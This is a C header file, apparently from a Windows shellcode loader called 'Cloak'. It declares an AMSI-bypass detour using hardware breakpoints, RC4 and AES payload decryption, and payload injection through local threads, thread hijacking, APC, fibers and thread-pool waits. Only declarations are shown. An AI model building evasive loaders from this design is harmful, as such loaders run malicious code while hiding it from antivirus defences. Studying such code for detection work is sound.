#pragma once

#ifndef CLOAK_H
#define CLOAK_H

#include <windows.h>
#include <stdio.h>

#include "Config.hpp"

#ifdef AES
#include "aes.h"
#endif // !AES

#ifdef BYPASS_AMSI
#include "HardwareBreakPoints.h"
#include "Structs.h"
VOID AmsiScanBufDetour(PCONTEXT pThreadCtx);
#endif // !BYPASS_AMSI

#ifdef RC4
typedef struct
{
	DWORD	Length;
	DWORD	MaxLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	USTRING* Data,
	USTRING* Key
);

#endif // !RC4

#ifdef LOCAL_THREAD
BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !LOCAL_THREAD

#ifdef LOCAL_THREAD_HIJACK
BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
VOID GottaCatchEmAll(); // useless function
#endif // !LOCAL_THREAD_HIJACK

#ifdef APC
VOID WaitForSingleObjectExAlertable();
BOOL ApcInjection(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !APC

#ifdef FIBERS
BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !FIBERS

#ifdef THREADPOOLWAIT
#include <threadpoolapiset.h>
BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize);
#endif // !THREADPOOLWAIT

#endif // !CLOAK_H